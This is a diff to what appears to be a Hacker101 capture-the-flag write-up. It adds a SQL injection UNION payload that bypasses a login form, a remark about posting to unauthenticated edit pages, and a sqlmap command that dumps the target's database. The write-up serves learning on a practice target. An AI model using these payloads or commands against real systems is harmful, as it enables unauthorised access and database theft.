@@ -32,4 +32,23 @@ Then I gave up and googled the answer which suggested this:
 ' UNION SELECT "xyz" as password FROM admins where ''='';--
 ```
 
-**Captured**
+Which can be simplified to this:
+
+```sql
+' UNION SELECT "xyz" as password;
+```
+
+So you can login by using the above as the username and `xyz` as the password
+
+### Unprotected edit pages
+
+You can post data directly to the edit page without being authenticated and it will accept it. see force-post.py
+
+### Get username and password via SQLi
+
+Thanks to the hints online I used [sqlmap](https://github.com/sqlmapproject/sqlmap) to essential dump the whole DB using a single command.
+
+```shell
+python sqlmap-dev/sqlmap.py -u https://a3e1b004a2d9bad3eb9d5e0d76494caf.ctf.hacker101.com/login \
+  --data "username=a&password=b" -p username --dump
+```
